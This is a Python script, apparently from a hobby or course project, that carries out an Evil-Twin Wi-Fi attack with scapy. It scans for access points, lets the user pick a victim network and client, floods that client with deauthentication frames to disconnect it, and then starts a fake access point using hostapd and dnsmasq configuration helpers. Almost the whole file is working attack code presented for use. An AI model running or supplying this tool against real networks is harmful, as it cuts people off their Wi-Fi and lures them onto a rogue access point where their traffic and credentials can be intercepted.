from scapy.all import *
from threading import *
import os, time

import fakeAP as f_ap
import CreateConf as cc
import MonitorMode as mm

network_adapter = ""

# Preparing the card for monitor mode
def switchToMonitorMode():
    os.system('sudo ifconfig %s down' % network_adapter)
    os.system('sudo iwconfig %s mode monitor' % network_adapter)
    os.system('sudo ifconfig %s up' % network_adapter)


#----- Scanning the area, searching for wifi access ------------

# Sniff packets
ap_list = [] 

def PacketHandlerAP(packet):
    # if packet has 802.11 layer (Becoin) and filter type & subtype of packets
    if packet.haslayer(Dot11): 
        if (packet.type == 0 and packet.subtype == 8):
            if [packet.addr2,packet.info, int(ord(packet[Dot11Elt:3].info))] not in ap_list:
                #AP, SSID, Channel
                ap_list.append([packet.addr2, packet.info, int(ord(packet[Dot11Elt:3].info))])
                # print("Access Point MAC: %s | with SSID: %s  | Channel: %d" %(packet.addr2,packet.info, int(ord(packet[Dot11Elt:3].info))))


def WLANScaning():
    global network_adapter
    print("Scanning for access points...")
    #Scan for 2 minutes
    sniff(iface = network_adapter, prn = PacketHandlerAP, timeout = 30)
    num = len(ap_list)
    for x in range(num):
       #Num of AP, SSID, AP MAC
       print(x, ap_list[x][1],ap_list[x][0])

    rescan = input("----- Do you want to rescan ? y/n -----")
    if(rescan=="y"):
        WLANScaning()


#-------- Selecting which access point(WLAN) we want to attack ------------

clientList = []

def attackAP():
    result = input("Choose number of AP to attack: ")
    
    #for creating the fake AP we need 2 '.conf' files
    create_conf_file(network_adapter2 , ap_list[int(result)][1], int(ap_list[int(result)][2]))

    #Change your network card to the same channel of AP victim
    setChannel(int(ap_list[int(result)][2]))
    #Client scanning from chosen AP
    clientScaning(ap_list[int(result)][0])


def create_conf_file(iface , ssid, channel):
    cc.Create_hostapd(iface, ssid, channel)
    cc.Create_dnsmasq(iface)


def setChannel(channel): 
      os.system('iwconfig %s channel %d' % (network_adapter, channel))


def clientScaning(AP_victim):
    print("Scanning for clients...")
    global target_mac
    target_mac = AP_victim
    sniff(iface=network_adapter,prn = PacketHandlerClients, timeout=30)


def PacketHandlerClients(packet):
   global clientList
   #
   if ((packet.addr2 == target_mac or packet.addr3 == target_mac) and packet.addr1 != "ff:ff:ff:ff:ff:ff"):
      #
      if packet.addr1 not in clientList:
        #
        if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
            clientList.append(packet.addr1)


# -------------Selecting a victim and performing an Evil-Twin attack ---------------

#Disconnects the target from the network
def attackClient():
    if(len(clientList) == 0):
        print("No clients found, searching again...")
        clientScaning(target_mac)

    for x in range(len(clientList)):
        print(x, clientList[x])

    rescan = input("----- Do you want to rescan? y/n -----")
    if(rescan =="y"):
        clientScaning(target_mac)

    choice = input("----- Choose client to attack -----")
    disconnectThread = threading.Thread(target = DisConnectAttack, args = (choice ,))
    disconnectThread.daemon = True
    disconnectThread.start()
    time.sleep(3)

def DisConnectAttack(choice):
    # send the packet
    for y in range(1000):
        dot11 = Dot11(addr1 = clientList[int(choice)], addr2=target_mac, addr3=target_mac)  
        packet = RadioTap()/dot11/Dot11Deauth()
        sendp(packet, iface=network_adapter, count=30, inter = .001)

# =================================================================================

if __name__ == "__main__":
    os.system("iwconfig") #show as the mode changed
    network_adapter = input("Please enter your network card name (iwconfig): ")
    network_adapter2 = input("Please enter your network card name (iwconfig) for FakeAP: ")
    switchToMonitorMode()
    WLANScaning()
    
    attackAP()

    attackClient()

    print('---> Raising up Fake AP spot\n')
    f_ap.start(network_adapter2)

    mm.Change_back_airmon(network_adapter)
    cc.Delete_conf_files()